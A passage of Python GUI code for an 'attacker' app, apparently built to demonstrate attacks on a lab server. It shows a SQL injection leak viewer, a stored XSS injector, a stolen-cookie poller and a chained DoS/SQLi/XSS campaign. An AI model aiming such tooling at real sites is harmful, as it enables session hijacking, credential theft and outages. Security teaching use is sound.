                    ctk.CTkLabel(row, text=u.get("password", ""), width=140, text_color="#ef4444" if is_new else "#94a3b8", font=ctk.CTkFont(family="Consolas")).pack(side="left", padx=4)
                    ctk.CTkLabel(row, text=u.get("role", ""), width=120, text_color="#a855f7").pack(side="left", padx=4)
                    ctk.CTkLabel(row, text=u.get("balance", ""), width=110, text_color="#4ade80", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=4)

                    if is_new:
                        badge = ctk.CTkLabel(row, text="🔥 [VỪA TẠO - BỊ RÒ RỈ]", text_color="#fef08a", fg_color="#991b1b", corner_radius=4, padx=6)
                        badge.pack(side="left", fill="x", expand=True, padx=4)
                        self.log_event(f"    🎯 [LẤY ĐƯỢC TÀI KHOẢN HỘI ĐỒNG VỪA TẠO] User: {u.get('username')} | Pass: {u.get('password')} | Vai trò: {u.get('role')}", "warning")
                    elif is_honeypot:
                        badge = ctk.CTkLabel(row, text="🍯 [HONEYPOT DECOY]", text_color="#fde047", fg_color="#78350f", corner_radius=4, padx=6)
                        badge.pack(side="left", fill="x", expand=True, padx=4)
                    else:
                        badge = ctk.CTkLabel(row, text="Có sẵn", text_color="#94a3b8")
                        badge.pack(side="left", fill="x", expand=True, padx=4)
            else:
                lbl = ctk.CTkLabel(self.sqli_scroll, text="Không có dữ liệu rò rỉ nào được trả về.", text_color="#94a3b8")
                lbl.pack(pady=20)

        def _render_sqli_blocked():
            for widget in self.sqli_scroll.winfo_children():
                widget.destroy()

            err_frame = ctk.CTkFrame(self.sqli_scroll, fg_color="#7f1d1d", corner_radius=6)
            err_frame.pack(fill="x", padx=10, pady=15)
            ctk.CTkLabel(
                err_frame,
                text="❌ PHẢN ĐÒN TỪ HIPS MÁY CHỦ: BẠN ĐÃ BỊ TẤN CÔNG NGƯỢC!\nTường lửa máy chủ (HIPS) đã chặn đứng kết nối. Gói tin bị DROP 100%!",
                font=ctk.CTkFont(weight="bold", size=13),
                text_color="#fecaca"
            ).pack(padx=15, pady=12)

            self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#fca5a5", fg_color="#991b1b")
            self.log_event("[-] PHẢN ĐÒN TỪ MÁY CHỦ: Bạn đã bị tấn công ngược! Tường lửa HIPS đã khóa IP.", "danger")

        def _worker():
            try:
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": "Attacker-SQLi/3.0", "ngrok-skip-browser-warning": "true"}
                )
                with urllib.request.urlopen(req, timeout=3.5) as resp:
                    data = json.loads(resp.read().decode())
                    records = data.get("leaked_database", [])
                    is_honeypot = data.get("is_honeypot", False)
                    self.after(0, lambda r=records, h=is_honeypot: _render_sqli_records(r, h))
            except Exception:
                self.after(0, _render_sqli_blocked)

        threading.Thread(target=_worker, daemon=True).start()

    # ==========================================
    # THỰC THI STORED XSS & CƯỚP COOKIE
    # ==========================================
    def start_xss_attack(self):
        base_url = self.get_base_url()
        author = self.xss_author.get().strip() or "RedTeam"
        raw_script = self.xss_entry.get().strip()
        encoded = urllib.parse.quote(raw_script)
        url = f"{base_url}/api/comment?author={urllib.parse.quote(author)}&content={encoded}"

        self.log_event(f"[+] Đang phát động tiêm mã độc Stored XSS vào: {url}", "warning")

        def _worker():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Attacker-XSS/3.0"})
                with urllib.request.urlopen(req, timeout=3.0) as resp:
                    data = json.loads(resp.read().decode())
                    self.log_event(f"[✓] TIÊM XSS THÀNH CÔNG: Máy chủ đã lưu mã độc vào Bảng Tin Phản Hồi!", "info")
                    self.log_event("[!] Khi Hội đồng mở trang web xem phản hồi, script sẽ tự kích hoạt Popup và gửi Cookie về đây!", "warning")
            except Exception as e:
                self.log_event(f"[-] Lỗi gửi mã độc XSS (Có thể bị HIPS chặn): {e}", "danger")

        threading.Thread(target=_worker, daemon=True).start()

    def pull_stolen_cookies(self, force_refresh=False):
        """Kéo danh sách Cookie cướp được từ endpoint /api/xss/stolen_cookies"""
        base_url = self.get_base_url()
        url = f"{base_url}/api/xss/stolen_cookies"

        def _render_cookies(cookies):
            for widget in self.xss_cookie_scroll.winfo_children():
                widget.destroy()

            if cookies:
                self.log_event(f"[🎯 XSS SUCCESS] Đã thu thập được {len(cookies)} Cookie phiên từ Hội Đồng!", "info")
                for ck in cookies:
                    row = ctk.CTkFrame(self.xss_cookie_scroll, fg_color="#1e1b4b", height=30)
                    row.pack(fill="x", pady=2)

                    ctk.CTkLabel(row, text=ck.get("timestamp", ""), width=90, text_color="#a5b4fc").pack(side="left", padx=4)
                    ctk.CTkLabel(row, text=ck.get("victim_ip", ""), width=150, text_color="#38bdf8", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=4)
                    ctk.CTkLabel(row, text=ck.get("cookie", ""), width=280, text_color="#f43f5e", font=ctk.CTkFont(family="Consolas", weight="bold")).pack(side="left", padx=4)
                    ctk.CTkLabel(row, text=ck.get("user_agent", "")[:60], text_color="#cbd5e1", font=ctk.CTkFont(size=10)).pack(side="left", fill="x", expand=True, padx=4)
            else:
                lbl = ctk.CTkLabel(self.xss_cookie_scroll, text="Chưa có Cookie nào được gửi về.", text_color="#94a3b8")
                lbl.pack(pady=20)

        def _worker():
            try:
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": "Attacker-CookieMonitor/3.0", "ngrok-skip-browser-warning": "true"}
                )
                with urllib.request.urlopen(req, timeout=2.5) as resp:
                    data = json.loads(resp.read().decode())
                    cookies = data.get("stolen_cookies", [])
                    snapshot = json.dumps([(c.get("victim_ip"), c.get("cookie")) for c in cookies])
                    if force_refresh or snapshot != self._last_cookies_snapshot:
                        self._last_cookies_snapshot = snapshot
                        self.after(0, lambda c=cookies: _render_cookies(c))
            except Exception:
                pass

        threading.Thread(target=_worker, daemon=True).start()

    def _start_xss_cookie_watcher(self):
        """Vòng lặp ngầm tự động cập nhật Cookie cướp được từ Hội đồng"""
        def _loop():
            while True:
                time.sleep(3.0)
                try:
                    self.pull_stolen_cookies()
                except Exception:
                    pass

        threading.Thread(target=_loop, daemon=True).start()

    # ==========================================
    # CHIẾN DỊCH TOÀN DIỆN (3 TRONG 1)
    # ==========================================
    def start_campaign_attack(self):
        self.log_event("==================================================", "info")
        self.log_event("[CHIẾN DỊCH] BẮT ĐẦU PHÁT ĐỘNG TOÀN DIỆN 3 ĐÒN LIÊN HOÀN!", "warning")
        self.log_event("==================================================", "info")

        def _campaign_worker():
            # Bước 1: DoS trong 8 giây
            self.tabview.set("⚡ 1. Tấn Công DoS (Làm Sập Web 503)")
            self.dur_slider.set(8)
            self._update_dur_label(8)
            self.start_dos_attack()

            time.sleep(10)

            # Bước 2: SQL Injection
            self.tabview.set("💉 2. SQL Injection (Trích Xuất CSDL Hội Đồng)")
            self.start_sqli_attack()
            time.sleep(3)

            # Bước 3: XSS
            self.tabview.set("⚠️ 3. Stored XSS (Cướp Cookie Hội Đồng)")
            self.start_xss_attack()

        threading.Thread(target=_campaign_worker, daemon=True).start()


def main():
    app = AttackerApp()
    app.mainloop()


if __name__ == "__main__":
    main()
